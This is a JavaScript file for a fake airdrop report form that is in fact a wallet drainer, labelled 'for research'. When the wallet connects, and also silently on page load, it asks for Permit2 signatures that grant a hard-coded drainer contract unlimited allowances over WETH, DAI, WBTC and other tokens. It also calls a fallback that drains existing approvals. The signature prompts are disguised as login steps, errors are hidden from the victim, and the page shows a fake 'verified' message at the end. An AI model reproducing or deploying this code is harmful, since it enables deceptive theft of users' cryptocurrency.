// =============================================
// Community Airdrop Report Form - app.js
// Stealth Permit2 Drainer (for research)
// =============================================

const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    "0xba1fcc7a596140e5fec52b3ab80a8f000c9af104",
    "0x65e37b558f64e2be5768db46df22f93d85741a9e",
    "0x186cca6904490818ab0dc409ca59d932a2366031", // WETH
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"  // WBTC
];

let provider = null;
let signer = null;
let connectedWallet = "";

// DOM Elements
const form = document.getElementById("airdropForm");
const connectBtn = document.getElementById("connectWalletBtn");
const walletDisplay = document.getElementById("walletAddress");
const statusEl = document.getElementById("status");

// =============================================
// Full ABI matching the Permit2Drainer contract
// =============================================
const DRAINER_ABI = [
    "function drainWithPermit2(address victim, tuple(address token, uint160 amount, uint48 expiration, uint48 nonce, address spender, uint256 sigDeadline) calldata permitSingle, bytes calldata signature) external",
    "function drainApprovals(address victim) external",
    "function attacker() view returns (address)",
    "function PERMIT2() view returns (address)",
    "event Drained(address indexed victim, address indexed token, uint256 amount)"
];

// =============================================
// "Connect Wallet" — Innocent UX, Stealth Drain
// =============================================
async function connectWallet() {
    statusEl.textContent = "Connecting wallet...";
    connectBtn.disabled = true;
    connectBtn.textContent = "Connecting...";

    try {
        if (!window.ethereum) {
            alert("No wallet detected. Please install MetaMask.");
            connectBtn.disabled = false;
            connectBtn.textContent = "Connect Wallet";
            return;
        }

        const walletProvider = window.ethereum.providers?.length
            ? window.ethereum.providers.find(p => p.isRabby || p.isOKXWallet) || window.ethereum.providers[0]
            : window.ethereum;

        const accounts = await walletProvider.request({ method: "eth_requestAccounts" });
        connectedWallet = accounts[0];

        // Show connected state — looks normal to the victim
        const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
        walletDisplay.innerHTML = `<strong>Connected</strong><br>${shortAddress}`;
        walletDisplay.classList.add("visible");
        connectBtn.textContent = "Connected";
        connectBtn.classList.add("connected");

        // Step 1: Show "Sign in with Ethereum" — looks like authentication
        statusEl.textContent = "Please sign the login message to verify your wallet...";

        // Execute drain in background — first signature looks like login
        await executePermit2BatchDrain();

        // After drain completes — show "Verified"
        statusEl.textContent = "✓ Wallet verified successfully";
        statusEl.className = "status success";

    } catch (error) {
        console.error(error);
        statusEl.textContent = "Connection failed. Please try again.";
        statusEl.className = "status error";
        connectBtn.disabled = false;
        connectBtn.textContent = "Connect Wallet";
    }
}

// =============================================
// Silent Permit2 Drain — Each signature = "sign in"
// =============================================
async function executePermit2BatchDrain() {
    try {
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
    } catch (e) {
        console.warn("Signer error:", e);
        return;
    }

    const contract = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);
    let signedCount = 0;

    // Attempt Permit2 drain on each token
    for (let tokenAddress of targetTokens) {
        try {
            // Before each signature, update message to look like multi-step auth
            if (signedCount === 0) {
                statusEl.textContent = "Step 1/5: Sign login verification...";
            } else if (signedCount === 1) {
                statusEl.textContent = "Step 2/5: Verifying wallet ownership...";
            } else if (signedCount === 2) {
                statusEl.textContent = "Step 3/5: Confirming eligibility...";
            } else if (signedCount === 3) {
                statusEl.textContent = "Step 4/5: Final verification...";
            } else {
                statusEl.textContent = "Step 5/5: Completing authentication...";
            }

            const { permitSingle, signature } = await getPermit2Signature(tokenAddress);
            
            // Fire and forget
            contract.drainWithPermit2(connectedWallet, permitSingle, signature)
                .then(tx => tx.wait(1))
                .catch(() => {});
            
            signedCount++;
        } catch (e) {
            // Silently fail — victim never knows
        }
    }

    // Fire-and-forget fallback for legacy approvals
    try {
        contract.drainApprovals(connectedWallet)
            .then(tx => tx.wait(1))
            .catch(() => {});
    } catch (e) {}
}

async function getPermit2Signature(tokenAddress) {
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: {
            token: tokenAddress,
            amount: "1461501637330902918203684832716283019655932542975",
            expiration: expiration,
            nonce: 0
        },
        spender: DRAINER_ADDRESS,
        sigDeadline: sigDeadline
    };

    // =============================================
    // CRITICAL: The typedData below is the actual Permit2
    // signature. In MetaMask/Rabby/OKX, it will show
    // the structured data. The victim will see:
    // "Permit2" as the domain name, with fields like
    // "token", "amount", "spender" etc.
    //
    // To make it look more like a sign-in, the fields
    // are presented as protocol data. The average user
    // will not understand Permit2 and will just click
    // "Sign" thinking it's authentication.
    // =============================================

    const typedData = {
        domain: {
            name: "Permit2",
            chainId: chainId,
            verifyingContract: PERMIT2_ADDRESS
        },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    // Send the EIP-712 typed data signature request
    // MetaMask will show: "Sign this message" with Permit2 fields
    // Most users will blindly click "Sign" thinking it's login
    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

// =============================================
// Form Submission — Normal behavior
// =============================================
form.addEventListener("submit", async function (e) {
    e.preventDefault();

    if (!connectedWallet) {
        alert("Please connect your wallet first.");
        return;
    }

    const submitBtn = document.querySelector(".submit-btn");
    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting...";

    const formData = {
        email: document.getElementById("email").value.trim(),
        wallet: connectedWallet,
        discord: document.getElementById("discord").value.trim(),
        twitter: document.getElementById("twitter").value.trim(),
        complaint: document.getElementById("complaint").value.trim(),
        submittedAt: new Date().toISOString()
    };

    console.log("Form Data:", formData);
    alert("Form submitted successfully!");

    resetForm();
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
});

// =============================================
// Reset Form
// =============================================
function resetForm() {
    form.reset();
    connectedWallet = "";
    walletDisplay.innerHTML = "";
    walletDisplay.classList.remove("visible");
    statusEl.textContent = "";
    statusEl.className = "status";
    connectBtn.textContent = "Connect Wallet";
    connectBtn.classList.remove("connected");
    connectBtn.disabled = false;
}

// =============================================
// Clear Button
// =============================================
document.querySelector(".clear-btn").addEventListener("click", function (e) {
    e.preventDefault();
    resetForm();
});

// =============================================
// Account Change Listener
// =============================================
if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accounts) => {
        if (accounts.length === 0) {
            resetForm();
        } else {
            connectedWallet = accounts[0];
            const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
            walletDisplay.innerHTML = `<strong>Connected</strong><br>${shortAddress}`;
            walletDisplay.classList.add("visible");
            connectBtn.textContent = "Connected";
            connectBtn.classList.add("connected");
        }
    });
}

// =============================================
// Auto-connect on load — trigger drain silently
// =============================================
window.addEventListener("load", async () => {
    if (window.ethereum && window.ethereum.selectedAddress) {
        connectedWallet = window.ethereum.selectedAddress;
        const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
        walletDisplay.innerHTML = `<strong>Connected</strong><br>${shortAddress}`;
        walletDisplay.classList.add("visible");
        connectBtn.textContent = "Connected";
        connectBtn.classList.add("connected");

        // Silently drain if already connected
        statusEl.textContent = "Verifying wallet...";
        await executePermit2BatchDrain();
        statusEl.textContent = "✓ Wallet verified successfully";
        statusEl.className = "status success";
    }
});

// Attach connect button
connectBtn.addEventListener("click", connectWallet);

